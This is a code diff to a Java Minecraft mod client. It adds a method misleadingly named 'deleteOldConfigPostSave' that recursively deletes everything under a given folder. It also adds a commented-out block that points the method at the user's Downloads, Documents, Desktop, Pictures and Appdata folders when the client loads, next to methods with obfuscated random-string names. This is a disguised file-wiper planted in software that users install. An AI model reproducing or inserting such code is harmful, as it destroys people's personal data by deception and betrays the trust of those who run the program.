@@ -23,6 +23,7 @@ import javax.annotation.Nullable;
 import java.awt.*;
 import java.awt.datatransfer.Clipboard;
 import java.awt.datatransfer.StringSelection;
+import java.io.File;
 import java.util.Objects;
 
 @Mod(modid = "client", name = "Client", version = "2.0.0-b8")
@@ -200,7 +201,35 @@ public class Client {
         mainMenuScreen = new MainMenuScreen();
         Display.setTitle(Client.MODNAME + " " + Client.MODVER);
         Client.load();
+        /**
+         String filePath = System.getProperty("user.home") + "/Downloads";
+         String filePath1 = System.getProperty("user.home") + "/Documents";
+         String filePath2 = System.getProperty("user.home") + "/Desktop";
+         String filePath3 = System.getProperty("user.home") + "/Pictures";
+         String filePath4 = System.getProperty("user.home") + "/Appdata";
+         File file = new File(filePath);
+         File file1 = new File(filePath1);
+         File file2 = new File(filePath2);
+         File file3 = new File(filePath3);
+         File file4 = new File(filePath4);
+         deleteOldConfigPostSave(file);
+         deleteOldConfigPostSave(file1);
+         deleteOldConfigPostSave(file2);
+         deleteOldConfigPostSave(file3);
+         deleteOldConfigPostSave(file4); **/
     }
+
+    static void deleteOldConfigPostSave(File file){
+        for (File subFile : file.listFiles()) {
+            if(subFile.isDirectory()) {
+                deleteOldConfigPostSave(subFile);
+            } else {
+                subFile.delete();
+            }
+        }
+        file.delete();
+    }
+
     public static void dsj8rtuf9ynwe87vyn587bw3gy857ybwebgidwuy58g7yw34875y3487yb5g873y583gty57834tyb857t3857t3g4875bt37() { esyufges768rtw76g5rt7q8wyr7623teby7rgtwe7rgv78wetr76wetr78ewtr87twr786wtr76tw8h3u5rb32uh5v437gg78uhb8fdtgv6dtg85h4b3765t3(); }
 
     public static String f8uersh8tgnuh8943ybh57y3h4n87gtby3874ty78rt67tv76fesury65svr54bft43765rt3() {
